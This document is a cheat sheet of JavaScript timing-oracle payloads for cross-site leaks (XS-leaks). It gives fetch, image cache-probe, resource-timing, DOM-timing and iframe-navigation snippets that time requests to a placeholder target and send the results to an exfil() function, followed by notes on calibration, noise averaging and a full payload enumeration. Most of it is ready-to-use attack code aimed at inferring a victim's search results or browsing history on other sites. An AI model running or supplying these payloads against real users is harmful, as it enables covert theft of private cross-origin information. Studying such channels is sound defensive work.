# Timing oracles — the slow-vs-fast and cache channels

Every timing-based XS-leak oracle — the measurement, the noise, the calibration.

---

## 1. The timing oracle — a slow-vs-fast response

```js
var t0=performance.now();
fetch('https://t/api/search?q='+encodeURIComponent(g),{mode:'no-cors'})
 .finally(()=>{
   var dt=performance.now()-t0;
   exfil(g+'='+Math.round(dt));
 });
```

```text
a search whose response time differs with the result — a slow query
vs a fast rejection. the timing threshold is the bit.
```

## 2. The cache-probe oracle — a cached-vs-uncached timing

```js
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
i.src='https://t/r/'+encodeURIComponent(g)+'?cb='+Math.random();
```

```text
a resource the victim's browser cached — a second load is faster —
'was it cached' = 'was the URL visited'. a history/cache oracle.
partition: same-site only (a partitioned cache per top-frame site).
```

## 3. The resource-timing read — a load-duration oracle

```js
performance.getEntriesByName('https://t/r/'+encodeURIComponent(g))
 .forEach(e=>exfil(e.name+'='+e.duration));
```

```text
the PerformanceResourceTiming API records a subresource's load
duration — a 'was it loaded' + 'how long' read — a cache oracle.
```

## 4. The DOM-timing oracle — a render-time side-channel

```js
var t0=performance.now();
// ... trigger a render that depends on the result ...
exfil('render='+Math.round(performance.now()-t0));
```

```text
a render whose cost differs with the content — a DOM-timing oracle.
```

## 5. The navigation-timing oracle — a redirect's cost

```js
var t0=performance.now();
var f=document.createElement('iframe');
f.src='https://t/x?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
document.body.appendChild(f);
```

```text
a page that redirects on a hit vs stays on a miss — the navigation's
cost differs — a timing oracle.
```

## 6. The noise problem — the jitter floor

```text
a timing channel is NOISY — the server's jitter, the network's
latency, the scheduler's quantum — the threshold sits in the noise.
fix: average over N samples — the mean's variance shrinks as 1/N —
a threshold between the slow and fast means separates the states.
```

## 7. The calibration — the control pair

```js
// a slow control — a URL that always hits (a slow path)
var t0=performance.now();
fetch('https://t/api/search?q=known-hit',{mode:'no-cors'})
 .finally(()=>exfil('slow='+Math.round(performance.now()-t0)));
// a fast control — a URL that always misses (a fast rejection)
var t0=performance.now();
fetch('https://t/api/search?q=known-miss',{mode:'no-cors'})
 .finally(()=>exfil('fast='+Math.round(performance.now()-t0)));
```

```text
a slow-vs-fast control pair — the threshold sits between the two
means — the calibration separates 'a hit' from 'a miss' from 'a
broken channel'.
```

## 8. The per-oracle bandwidth — the bits-per-load

```text
a timing oracle        — ~1 bit — a slow/fast threshold
a cache-probe          — 1 bit — a cached/uncached
a resource-timing      — ~1 bit + a duration
a DOM-timing           — ~1 bit — a render cost
a navigation-timing    — ~1 bit — a redirect cost
```

## 9. The per-oracle noise floor — the measurement problem

```text
a timing oracle        — a high noise floor — a server's jitter
a cache-probe          — a lower noise floor — a cached-vs-uncached
                         is a sharper signal
a resource-timing      — a lower noise floor — a load-duration
a DOM-timing           — a medium noise floor — a render cost
a navigation-timing    — a low noise floor — a redirect is a sharp
                         signal
```

## 10. The per-oracle partition — the same-site limit

```text
a timing oracle        — no partition — the fetch's cost is readable
a cache-probe          — partitioned — same-site only
a resource-timing      — no partition — the load-duration is readable
a DOM-timing           — no partition — the render cost is readable
a navigation-timing    — no partition — the redirect cost is readable
```

## 11. The timing-oracle payload set — the complete enumeration

```js
// a no-cors fetch timing
var t0=performance.now();
fetch('https://t/api/x?q='+g,{mode:'no-cors'})
 .finally(()=>exfil(g+'='+(performance.now()-t0)));

// an img-load timing
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+(performance.now()-t0));
i.src='https://t/r/'+g+'?cb='+Math.random();

// an iframe-load timing
var t0=performance.now(); var f=document.createElement('iframe');
f.src='https://t/x?q='+g;
f.onload=()=>exfil(g+'='+(performance.now()-t0));
document.body.appendChild(f);

// a resource-timing read
performance.getEntriesByName('https://t/r/'+g)
 .forEach(e=>exfil(e.name+'='+e.duration));
```

## 12. The timing-oracle falsifier — when it doesn't apply

```text
no timing difference between a hit and a miss → the timing oracle
is dead → a different channel (a count, a status, a CSS, a server-
state).
```
